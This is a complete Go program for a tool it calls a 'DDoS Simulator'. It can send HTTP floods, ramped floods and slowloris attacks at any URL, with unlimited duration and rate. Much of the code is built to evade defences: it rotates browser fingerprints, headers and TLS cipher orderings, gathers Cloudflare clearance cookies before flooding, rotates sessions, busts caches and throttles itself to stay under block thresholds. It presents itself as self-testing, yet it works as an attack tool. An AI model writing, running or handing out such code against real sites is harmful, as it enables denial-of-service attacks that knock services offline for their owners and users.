package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/fatih/color"
	"golang.org/x/time/rate"
)

// --- User-Agent pool ---

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
}

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"application/json, text/plain, */*",
	"text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, */*;q=0.8",
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-US,en;q=0.5",
	"en-GB,en;q=0.9,en-US;q=0.8",
	"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
	"de-DE,de;q=0.9,en;q=0.8",
	"es-ES,es;q=0.9,en;q=0.8",
	"pt-BR,pt;q=0.9,en;q=0.8",
	"ja;q=0.9,en-US;q=0.8,en;q=0.7",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.google.com/search?q=site",
	"https://www.bing.com/search?q=site",
	"https://duckduckgo.com/?q=site",
	"https://www.facebook.com/",
	"https://t.co/redirect",
	"https://www.reddit.com/",
	"https://www.linkedin.com/",
	"https://news.ycombinator.com/",
	"https://www.youtube.com/",
	"", "", "", "",
}

// TLS fingerprint variations — different cipher suites mimic different browsers
var tlsConfigs = []*tls.Config{
	{ // Chrome-like
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
	},
	{ // Firefox-like
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
	},
	{ // Safari-like
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	},
}

var encodings = []string{
	"gzip, deflate, br",
	"gzip, deflate",
	"gzip, deflate, br, zstd",
	"gzip",
}

var cachePolicies = []string{
	"no-cache",
	"max-age=0",
	"",
}

// --- Attack modes ---

const (
	ModeFlood     = "flood"
	ModeStealth   = "stealth"
	ModeRamp      = "ramp"
	ModeSlowloris = "slowloris"
)

// --- Config ---

type TestConfig struct {
	URL                string
	Duration           time.Duration
	ConcurrentWorkers  int
	RequestsPerSecond  int
	TotalRequests      int64
	Method             string
	Body               string
	InsecureSkipVerify bool
	Timeout            time.Duration
	Mode               string
	Paths              []string
}

// --- Adaptive rate controller ---
// Monitors block rate and automatically adjusts throughput

type AdaptiveController struct {
	throttleFactor int64 // 0 = full speed, 1-5 = increasingly throttled
	lastBlockRate  float64
}

func (a *AdaptiveController) GetDelay() time.Duration {
	f := atomic.LoadInt64(&a.throttleFactor)
	if f <= 0 {
		return 0
	}
	// Exponential backoff: 5ms, 15ms, 40ms, 80ms, 150ms
	delays := []time.Duration{5, 15, 40, 80, 150}
	idx := int(f) - 1
	if idx >= len(delays) {
		idx = len(delays) - 1
	}
	base := delays[idx] * time.Millisecond
	jitter := time.Duration(rand.Intn(int(base/2) + 1))
	return base + jitter
}

func (a *AdaptiveController) Update(metrics *Metrics) {
	total := atomic.LoadInt64(&metrics.TotalRequests)
	blocked := atomic.LoadInt64(&metrics.BlockedRequests)
	if total < 100 {
		return
	}
	blockRate := float64(blocked) / float64(total) * 100

	var newFactor int64
	switch {
	case blockRate > 60:
		newFactor = 5
	case blockRate > 40:
		newFactor = 4
	case blockRate > 25:
		newFactor = 3
	case blockRate > 15:
		newFactor = 2
	case blockRate > 8:
		newFactor = 1
	default:
		newFactor = 0
	}

	old := atomic.LoadInt64(&a.throttleFactor)
	if newFactor != old {
		atomic.StoreInt64(&a.throttleFactor, newFactor)
		if newFactor > old {
			color.Yellow("  [adaptive] Block rate %.0f%% -> throttling (level %d)", blockRate, newFactor)
		} else {
			color.Green("  [adaptive] Block rate %.0f%% -> easing (level %d)", blockRate, newFactor)
		}
	}
	a.lastBlockRate = blockRate
}

// --- Metrics ---

type Metrics struct {
	TotalRequests      int64
	SuccessfulRequests int64
	FailedRequests     int64
	ErrorCount         int64
	BlockedRequests    int64
	TotalResponseTime  int64
	TotalDuration      time.Duration
	MinResponseTime    time.Duration
	MaxResponseTime    time.Duration
	StatusCodes        map[int]int64
	Errors             map[string]int64
	mutex              sync.RWMutex
}

type RequestResult struct {
	Duration   time.Duration
	StatusCode int
	Error      error
}

func NewMetrics() *Metrics {
	return &Metrics{
		StatusCodes:     make(map[int]int64),
		Errors:          make(map[string]int64),
		MinResponseTime: time.Hour,
	}
}

// classifyError maps raw error strings into short categories for aggregated display.
func classifyError(err error) string {
	msg := err.Error()
	switch {
	case strings.Contains(msg, "write tcp"):
		return "write tcp (connection reset / broken pipe)"
	case strings.Contains(msg, "read tcp"):
		return "read tcp (connection reset by peer)"
	case strings.Contains(msg, "dial tcp"):
		if strings.Contains(msg, "connect: connection refused") {
			return "dial tcp (connection refused)"
		}
		if strings.Contains(msg, "i/o timeout") {
			return "dial tcp (timeout)"
		}
		return "dial tcp (connection failed)"
	case strings.Contains(msg, "context deadline exceeded"):
		return "request timeout"
	case strings.Contains(msg, "context canceled"):
		return "context canceled"
	case strings.Contains(msg, "EOF"):
		return "unexpected EOF"
	case strings.Contains(msg, "too many open files"):
		return "too many open files (fd exhaustion)"
	default:
		if len(msg) > 60 {
			return msg[:60]
		}
		return msg
	}
}

func (m *Metrics) Update(result RequestResult) {
	atomic.AddInt64(&m.TotalRequests, 1)

	if result.Error != nil {
		atomic.AddInt64(&m.FailedRequests, 1)
		atomic.AddInt64(&m.ErrorCount, 1)
	} else if result.StatusCode >= 500 {
		atomic.AddInt64(&m.FailedRequests, 1)
	} else {
		atomic.AddInt64(&m.SuccessfulRequests, 1)
	}

	if result.StatusCode == 403 || result.StatusCode == 429 || result.StatusCode == 503 {
		atomic.AddInt64(&m.BlockedRequests, 1)
	}

	atomic.AddInt64(&m.TotalResponseTime, int64(result.Duration))

	m.mutex.Lock()
	defer m.mutex.Unlock()

	if result.Error != nil {
		errCat := classifyError(result.Error)
		m.Errors[errCat]++
	} else {
		m.StatusCodes[result.StatusCode]++
	}

	if result.Duration < m.MinResponseTime {
		m.MinResponseTime = result.Duration
	}
	if result.Duration > m.MaxResponseTime {
		m.MaxResponseTime = result.Duration
	}
}

func (m *Metrics) PrintSummary() {
	total := atomic.LoadInt64(&m.TotalRequests)
	successful := atomic.LoadInt64(&m.SuccessfulRequests)
	failed := atomic.LoadInt64(&m.FailedRequests)
	blocked := atomic.LoadInt64(&m.BlockedRequests)
	errors := atomic.LoadInt64(&m.ErrorCount)

	color.Cyan("\n======================================")
	color.Cyan("         LOAD TEST SUMMARY            ")
	color.Cyan("======================================")

	color.White("\n  Total Requests:    %d", total)
	color.Green("  Successful:        %d", successful)
	color.Red("  Failed:            %d", failed)

	if total > 0 {
		successRate := float64(successful) / float64(total) * 100
		color.Yellow("  Success Rate:      %.2f%%", successRate)
	}

	color.Cyan("\n-- Protection Detection --")
	color.Yellow("  Blocked/Challenged: %d", blocked)
	if total > 0 {
		blockRate := float64(blocked) / float64(total) * 100
		if blockRate > 50 {
			color.Red("  Block Rate:         %.2f%% -- Protection is active!", blockRate)
		} else if blockRate > 10 {
			color.Yellow("  Block Rate:         %.2f%% -- Protection partially engaged", blockRate)
		} else if blockRate > 0 {
			color.Green("  Block Rate:         %.2f%% -- Minimal blocking", blockRate)
		} else {
			color.Green("  Block Rate:         0.00%% -- No blocking detected")
		}
	}

	if errors > 0 {
		color.Red("  Connection Errors:  %d", errors)
	}

	color.Cyan("\n-- Response Times --")
	color.White("  Min: %v", m.MinResponseTime)
	color.White("  Max: %v", m.MaxResponseTime)
	if total > 0 {
		avg := time.Duration(m.TotalResponseTime / total)
		color.White("  Avg: %v", avg)
	}

	color.Cyan("\n-- Status Codes --")
	m.mutex.RLock()
	for code, count := range m.StatusCodes {
		label := ""
		switch {
		case code == 403:
			label = " (BLOCKED)"
		case code == 429:
			label = " (RATE LIMITED)"
		case code == 503:
			label = " (CHALLENGE/DOWN)"
		case code >= 500:
			label = " (SERVER ERROR)"
		}
		color.White("  %d: %d%s", code, count, label)
	}

	if len(m.Errors) > 0 {
		color.Cyan("\n-- Connection Errors --")
		for errMsg, count := range m.Errors {
			color.Red("  %s: %d", errMsg, count)
		}
	}
	m.mutex.RUnlock()

	if m.TotalDuration.Seconds() > 0 {
		rps := float64(total) / m.TotalDuration.Seconds()
		color.Yellow("\n  Requests/sec: %.2f", rps)
		color.White("  Duration:     %v", m.TotalDuration.Round(time.Millisecond))
	}
}

// --- Request builder with evasion ---

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func buildEvasiveRequest(method, targetURL string, body io.Reader, stealth bool) (*http.Request, error) {
	req, err := http.NewRequest(method, targetURL, body)
	if err != nil {
		return nil, err
	}

	ua := randomUA()
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
	req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
	req.Header.Set("Accept-Encoding", encodings[rand.Intn(len(encodings))])
	req.Header.Set("Connection", "keep-alive")

	if ref := referers[rand.Intn(len(referers))]; ref != "" {
		req.Header.Set("Referer", ref)
	}

	if cp := cachePolicies[rand.Intn(len(cachePolicies))]; cp != "" {
		req.Header.Set("Cache-Control", cp)
	}

	if stealth {
		if strings.Contains(ua, "Chrome") {
			req.Header.Set("sec-ch-ua", "\"Chromium\";v=\"125\", \"Google Chrome\";v=\"125\", \"Not=A?Brand\";v=\"24\"")
			req.Header.Set("sec-ch-ua-mobile", "?0")
			req.Header.Set("sec-ch-ua-platform", "\"macOS\"")
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
			req.Header.Set("Sec-Fetch-User", "?1")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
		} else if strings.Contains(ua, "Firefox") {
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
			req.Header.Set("Sec-Fetch-User", "?1")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			req.Header.Set("DNT", "1")
		}
	}

	return req, nil
}

var cbParams = []string{"_", "v", "t", "cb", "nc", "r"}

func cacheBustURL(baseURL string) string {
	sep := "?"
	if strings.Contains(baseURL, "?") {
		sep = "&"
	}
	param := cbParams[rand.Intn(len(cbParams))]
	// Use shorter values that look more natural than huge int64s
	val := rand.Intn(999999)
	return fmt.Sprintf("%s%s%s=%d", baseURL, sep, param, val)
}

func pickTarget(config *TestConfig) string {
	if len(config.Paths) > 0 && rand.Intn(3) > 0 {
		parsed, err := url.Parse(config.URL)
		if err == nil {
			path := config.Paths[rand.Intn(len(config.Paths))]
			parsed.Path = path
			return parsed.String()
		}
	}
	return config.URL
}

// --- Payload ---

type DynamicPayload struct {
	UserID    int    `json:"user_id"`
	Timestamp int64  `json:"timestamp"`
	Data      string `json:"data"`
	Sequence  int    `json:"sequence"`
}

func generateDynamicPayload(seq int) string {
	payload := DynamicPayload{
		UserID:    rand.Intn(10000) + 1,
		Timestamp: time.Now().UnixNano(),
		Data:      fmt.Sprintf("test_data_%d_%d", seq, rand.Intn(1000)),
		Sequence:  seq,
	}
	data, _ := json.Marshal(payload)
	return string(data)
}

// --- Session builder (cookie jar + varied TLS) ---

func buildClient(config *TestConfig, workerID int) *http.Client {
	jar, _ := cookiejar.New(nil)

	// Pick a TLS config variant based on worker ID for fingerprint diversity
	baseTLS := tlsConfigs[workerID%len(tlsConfigs)]
	tlsCfg := baseTLS.Clone()
	tlsCfg.InsecureSkipVerify = config.InsecureSkipVerify

	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSClientConfig:       tlsCfg,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		MaxIdleConns:          5,
		MaxIdleConnsPerHost:   5,
		MaxConnsPerHost:       5,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false, // real browsers accept compression
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true, // real browsers use H2
		WriteBufferSize:       4096,
		ReadBufferSize:        4096,
	}

	return &http.Client{
		Timeout:   config.Timeout,
		Transport: transport,
		Jar:       jar, // accept & resend Cloudflare cookies (__cf_bm, cf_clearance)
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

// warmupSession does a slow initial request to collect CF cookies before flooding.
func warmupSession(client *http.Client, config *TestConfig) {
	req, err := buildEvasiveRequest("GET", config.URL, nil, true)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	// small human-like delay after page load
	time.Sleep(time.Duration(200+rand.Intn(500)) * time.Millisecond)
}

// --- Request execution ---

// isRetryable returns true for transient TCP errors worth retrying.
func isRetryable(err error) bool {
	if err == nil {
		return false
	}
	msg := err.Error()
	return strings.Contains(msg, "write tcp") ||
		strings.Contains(msg, "read tcp") ||
		strings.Contains(msg, "EOF") ||
		strings.Contains(msg, "connection reset")
}

func makeRequest(client *http.Client, config *TestConfig, sequence int) RequestResult {
	const maxRetries = 2
	stealth := config.Mode == ModeStealth

	for attempt := 0; attempt <= maxRetries; attempt++ {
		start := time.Now()

		targetURL := pickTarget(config)
		if config.Method == "GET" {
			targetURL = cacheBustURL(targetURL)
		}

		var body io.Reader
		if config.Method != "GET" && config.Body != "" {
			if config.Body == "dynamic" {
				body = bytes.NewBufferString(generateDynamicPayload(sequence))
			} else {
				body = bytes.NewBufferString(config.Body)
			}
		}

		req, err := buildEvasiveRequest(config.Method, targetURL, body, stealth)
		if err != nil {
			return RequestResult{Duration: time.Since(start), Error: err}
		}

		resp, err := client.Do(req)
		if err != nil {
			if attempt < maxRetries && isRetryable(err) {
				time.Sleep(time.Duration(10*(attempt+1)) * time.Millisecond)
				continue
			}
			return RequestResult{Duration: time.Since(start), Error: err}
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		return RequestResult{
			Duration:   time.Since(start),
			StatusCode: resp.StatusCode,
		}
	}

	return RequestResult{Error: fmt.Errorf("max retries exceeded")}
}

// --- Slowloris ---

func slowlorisWorker(id int, config *TestConfig, metrics *Metrics, wg *sync.WaitGroup,
	ctx context.Context, requestCounter *int64) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		default:
			if config.TotalRequests > 0 {
				current := atomic.AddInt64(requestCounter, 1)
				if current > config.TotalRequests {
					return
				}
			}

			start := time.Now()
			targetURL := cacheBustURL(pickTarget(config))

			parsed, _ := url.Parse(targetURL)
			host := parsed.Host
			if !strings.Contains(host, ":") {
				if parsed.Scheme == "https" {
					host += ":443"
				} else {
					host += ":80"
				}
			}

			var conn net.Conn
			var err error
			dialer := &net.Dialer{Timeout: 10 * time.Second}

			if parsed.Scheme == "https" {
				conn, err = tls.DialWithDialer(dialer, "tcp", host, &tls.Config{
					InsecureSkipVerify: config.InsecureSkipVerify,
				})
			} else {
				conn, err = dialer.DialContext(ctx, "tcp", host)
			}

			if err != nil {
				metrics.Update(RequestResult{Duration: time.Since(start), Error: err})
				continue
			}

			reqURI := "/"
			if parsed.RequestURI() != "" {
				reqURI = parsed.RequestURI()
			}
			reqLine := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
				reqURI, parsed.Hostname(), randomUA())
			conn.Write([]byte(reqLine))

			for i := 0; i < 10; i++ {
				select {
				case <-ctx.Done():
					conn.Close()
					return
				case <-time.After(time.Duration(3+rand.Intn(7)) * time.Second):
					header := fmt.Sprintf("X-a-%d: %d\r\n", i, rand.Intn(10000))
					if _, err := conn.Write([]byte(header)); err != nil {
						break
					}
				}
			}

			conn.Close()
			metrics.Update(RequestResult{Duration: time.Since(start), StatusCode: 0})
		}
	}
}

// --- Standard worker ---

func worker(id int, config *TestConfig, metrics *Metrics, wg *sync.WaitGroup,
	ctx context.Context, rateLimiter *rate.Limiter, requestCounter *int64, client *http.Client,
	adaptive *AdaptiveController) {
	defer wg.Done()

	// Warmup: collect Cloudflare cookies before hitting hard
	warmupSession(client, config)

	sequence := 0
	// Periodically rotate to a fresh session to avoid long-lived TLS fingerprinting
	sessionLifetime := 500 + rand.Intn(500) // rotate every 500-1000 requests

	for {
		select {
		case <-ctx.Done():
			return
		default:
			if config.TotalRequests > 0 {
				current := atomic.AddInt64(requestCounter, 1)
				if current > config.TotalRequests {
					return
				}
			}

			if rateLimiter != nil {
				if err := rateLimiter.Wait(ctx); err != nil {
					return
				}
			}

			// Adaptive throttle: slow down if getting blocked
			if adaptive != nil {
				if d := adaptive.GetDelay(); d > 0 {
					time.Sleep(d)
				}
			}

			if config.Mode == ModeStealth {
				// Realistic human browsing jitter: 20-200ms with occasional longer pauses
				jitter := time.Duration(20+rand.Intn(180)) * time.Millisecond
				if rand.Intn(20) == 0 {
					jitter += time.Duration(500+rand.Intn(2000)) * time.Millisecond
				}
				time.Sleep(jitter)
			}

			sequence++
			result := makeRequest(client, config, sequence)
			metrics.Update(result)

			// Session rotation: fresh TLS + cookies
			if sequence%sessionLifetime == 0 {
				client = buildClient(config, id+rand.Intn(100))
				warmupSession(client, config)
				sessionLifetime = 500 + rand.Intn(500)
			}
		}
	}
}

// --- Load test orchestrator ---

func startLoadTest(config *TestConfig) {
	color.Cyan("======================================")
	color.Cyan("          DDoS SIMULATOR              ")
	color.Cyan("======================================")
	color.White("\n  Target:   %s", config.URL)
	color.White("  Mode:     %s", config.Mode)
	if config.TotalRequests > 0 {
		color.White("  Requests: %d", config.TotalRequests)
	}
	if config.Duration < 24*time.Hour {
		color.White("  Duration: %v", config.Duration)
	}
	color.White("  Workers:  %d", config.ConcurrentWorkers)
	if config.RequestsPerSecond > 0 {
		color.White("  RPS Cap:  %d", config.RequestsPerSecond)
	}
	if len(config.Paths) > 0 {
		color.White("  Paths:    %d extra paths", len(config.Paths))
	}
	fmt.Println()

	metrics := NewMetrics()
	var wg sync.WaitGroup
	var requestCounter int64

	ctx, cancel := context.WithTimeout(context.Background(), config.Duration)
	defer cancel()

	startTime := time.Now()

	if config.Mode == ModeSlowloris {
		for i := 0; i < config.ConcurrentWorkers; i++ {
			wg.Add(1)
			go slowlorisWorker(i, config, metrics, &wg, ctx, &requestCounter)
		}
	} else {
		var rateLimiter *rate.Limiter
		if config.RequestsPerSecond > 0 {
			burst := config.RequestsPerSecond
			if burst > 1000 {
				burst = 1000
			}
			rateLimiter = rate.NewLimiter(rate.Limit(config.RequestsPerSecond), burst)
		}

		adaptive := &AdaptiveController{}

		// Launch adaptive monitor
		go func() {
			ticker := time.NewTicker(3 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					adaptive.Update(metrics)
				}
			}
		}()

		color.Cyan("  Warming up sessions...")

		if config.Mode == ModeRamp {
			initialWorkers := config.ConcurrentWorkers / 10
			if initialWorkers < 1 {
				initialWorkers = 1
			}

			for i := 0; i < initialWorkers; i++ {
				client := buildClient(config, i)
				wg.Add(1)
				go worker(i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client, adaptive)
			}

			go func() {
				remaining := config.ConcurrentWorkers - initialWorkers
				batchSize := remaining / 10
				if batchSize < 1 {
					batchSize = 1
				}
				launched := initialWorkers
				for launched < config.ConcurrentWorkers {
					select {
					case <-ctx.Done():
						return
					case <-time.After(3 * time.Second):
						toAdd := batchSize
						if launched+toAdd > config.ConcurrentWorkers {
							toAdd = config.ConcurrentWorkers - launched
						}
						for i := 0; i < toAdd; i++ {
							client := buildClient(config, launched+i)
							wg.Add(1)
							go worker(launched+i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client, adaptive)
						}
						launched += toAdd
						color.Yellow("  -> Ramped to %d/%d workers", launched, config.ConcurrentWorkers)
					}
				}
			}()
		} else {
			for i := 0; i < config.ConcurrentWorkers; i++ {
				client := buildClient(config, i)
				wg.Add(1)
				go worker(i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client, adaptive)
			}
		}
	}

	// Progress monitor
	done := make(chan struct{})
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		var lastTotal int64

		for {
			select {
			case <-ticker.C:
				total := atomic.LoadInt64(&metrics.TotalRequests)
				blocked := atomic.LoadInt64(&metrics.BlockedRequests)
				elapsed := time.Since(startTime).Seconds()
				currentRPS := float64(total) / elapsed
				intervalRPS := float64(total-lastTotal) / 5.0
				lastTotal = total

				statusStr := color.GreenString("OK")
				if blocked > 0 && total > 0 {
					blockRate := float64(blocked) / float64(total) * 100
					if blockRate > 50 {
						statusStr = color.RedString("BLOCKED %.0f%%", blockRate)
					} else if blockRate > 10 {
						statusStr = color.YellowString("PARTIAL %.0f%%", blockRate)
					}
				}

				fmt.Printf("  [%s] RPS: %.0f (avg %.0f) | Total: %d | Blocked: %d | %s\n",
					time.Since(startTime).Round(time.Second), intervalRPS, currentRPS, total, blocked, statusStr)
			case <-done:
				return
			}
		}
	}()

	wg.Wait()
	close(done)
	cancel()
	metrics.TotalDuration = time.Since(startTime)

	metrics.PrintSummary()
}

// --- CLI ---

func main() {
	if len(os.Args) < 2 {
		printUsage()
		return
	}

	targetURL := os.Args[1]

	config := &TestConfig{
		URL:                targetURL,
		Duration:           30 * time.Second,
		ConcurrentWorkers:  10,
		RequestsPerSecond:  50,
		Method:             "GET",
		Body:               "dynamic",
		InsecureSkipVerify: true,
		Timeout:            10 * time.Second,
		Mode:               ModeFlood,
		Paths: []string{
			"/",
			"/",
			"/",
			"/favicon.ico",
			"/robots.txt",
			"/sitemap.xml",
			"/api",
			"/api/v1",
			"/health",
			"/status",
			"/.well-known/security.txt",
		},
	}

	if len(os.Args) > 2 {
		if d, err := time.ParseDuration(os.Args[2]); err == nil {
			config.Duration = d
		}
	}
	if len(os.Args) > 3 {
		if w, err := strconv.Atoi(os.Args[3]); err == nil {
			config.ConcurrentWorkers = w
		}
	}
	if len(os.Args) > 4 {
		if r, err := strconv.Atoi(os.Args[4]); err == nil {
			config.RequestsPerSecond = r
		}
	}
	if len(os.Args) > 5 {
		if t, err := strconv.ParseInt(os.Args[5], 10, 64); err == nil {
			config.TotalRequests = t
		}
	}
	if len(os.Args) > 6 {
		mode := strings.ToLower(os.Args[6])
		switch mode {
		case ModeFlood, ModeStealth, ModeRamp, ModeSlowloris:
			config.Mode = mode
		default:
			color.Red("Unknown mode: %s. Using flood.", mode)
		}
	}

	if config.Duration == 0 {
		config.Duration = 24 * time.Hour
	}

	// Raise file descriptor limit
	var rlimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rlimit); err == nil {
		needed := uint64(config.ConcurrentWorkers*2 + 100)
		if rlimit.Cur < needed {
			rlimit.Cur = needed
			if rlimit.Cur > rlimit.Max {
				rlimit.Cur = rlimit.Max
			}
			if err := syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rlimit); err != nil {
				color.Red("  Warning: File descriptor limit too low. Run: ulimit -n %d", needed)
			} else {
				color.Green("  Raised file descriptor limit to %d", rlimit.Cur)
			}
		}
	}

	if config.ConcurrentWorkers > 5000 {
		color.Red("  Warning: Very high concurrency may crash your system")
	}

	color.Yellow("\n  Press Enter to start or Ctrl+C to cancel...")
	fmt.Scanln()

	startLoadTest(config)
}

func printUsage() {
	color.Cyan("DDoS Simulator - Test your infrastructure protection")
	fmt.Println()
	fmt.Println("Usage: ddos-sim <url> [duration] [workers] [rps] [total] [mode]")
	fmt.Println()
	fmt.Println("Arguments:")
	fmt.Println("  url       Target URL (required)")
	fmt.Println("  duration  Test duration, e.g. 30s, 5m, 0 for unlimited (default: 30s)")
	fmt.Println("  workers   Concurrent connections (default: 10)")
	fmt.Println("  rps       Max requests/sec, 0 for unlimited (default: 50)")
	fmt.Println("  total     Total requests to send, 0 for unlimited (default: 0)")
	fmt.Println("  mode      Attack mode (default: flood)")
	fmt.Println()
	color.Cyan("Attack Modes:")
	fmt.Println("  flood      Max speed, rotated headers and cache busting")
	fmt.Println("  stealth    Realistic traffic with jitter and full browser fingerprint")
	fmt.Println("  ramp       Gradually increase workers over time")
	fmt.Println("  slowloris  Hold connections open with slow partial requests")
	fmt.Println()
	color.Cyan("Examples:")
	fmt.Println("  ddos-sim https://mysite.com 60s 100 0 0 flood")
	fmt.Println("  ddos-sim https://mysite.com 0 50 0 10000 stealth")
	fmt.Println("  ddos-sim https://mysite.com 2m 500 0 0 ramp")
	fmt.Println("  ddos-sim https://mysite.com 60s 1000 0 0 slowloris")
}
